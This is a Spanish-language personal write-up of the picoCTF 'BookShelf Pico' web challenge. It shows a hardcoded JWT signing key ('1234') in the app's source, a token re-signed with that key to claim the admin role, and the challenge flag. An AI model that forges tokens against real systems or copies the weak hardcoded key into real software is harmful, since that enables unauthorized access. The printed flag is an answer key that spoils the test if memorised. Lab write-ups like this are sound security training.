#Software #Hacking #WebExplotation #Web #Internet 
Hecho por: [[Yo|Adrián Fernando Cuevas Solís]]
# Definición
BookShelf Pico, my premium online book-reading service.I believe that my website is super secure. I challenge you to prove me wrong by reading the 'Flag' book!Here are the credentials to get you started:

- Username: "user"
- Password: "user"

Source code can be downloaded [here](https://artifacts.picoctf.net/c/478/bookshelf-pico.zip).Website can be accessed [here!](http://saturn.picoctf.net:58251/).
# Hints
- Maybe try to find the JWT Signing Key ("secret key") in the source code? Maybe it's hardcoded somewhere? Or maybe try to crack it?
- The 'role' and 'userId' fields in the JWT can be of interest to you!
- The 'controllers', 'services' and 'security' java packages in the given source code might need your attention. We've provided a README.md file that contains some documentation.
- Upgrade your 'role' with the _new_ (cracked) JWT. And re-login for the new role to get reflected in browser's localStorage.
# Solución
1. Primero ingresamos a la página web y nos registramos.
2. Tratamos de conseguir la bandera, pero nos dice que debemos de ser admin para conseguirlo.
3. Así que ahora vamos y checamos el código que nos proporcionaron
4. Después de buscar un rato vemos esto que nos llama la atención (en el archivo SecretGenerator.java)
```java
private String generateRandomString(int len) {
        // not so random
        return "1234";
    }
```
5. Así que con esto nos disponemos a modificar el [[JWT]], y encontramos que es este:
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTc0NTM2NzIyMywiaWF0IjoxNzQ0NzYyNDIzLCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.l0u-DQl-9auAWnX_ojFpUd3otIxCPldf5w9MSLWyMUs
6. Nos apoyamos de [jwt token editor](https://jwt.io/), y modificamos tanto la contraseña (a 1234), el usuario y el rol (admin), así como el userID(2). Y nos da este nuevo token:
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiQWRtaW4iLCJpc3MiOiJib29rc2hlbGYiLCJleHAiOjE3NDUzNjcyMjMsImlhdCI6MTc0NDc2MjQyMywidXNlcklkIjoyLCJlbWFpbCI6ImFkbWluIn0.Zminxoo7JSSU0D2sXlM-CFdUMxDkxGzmQ3du1qwmV7Q
7. Lo modificamos en la página y obtenemos la bandera:
Great job! Here’s your flag:picoCTF{w34k_jwt_n0t_g00d_602ce414}
## Respuesta
picoCTF{w34k_jwt_n0t_g00d_602ce414}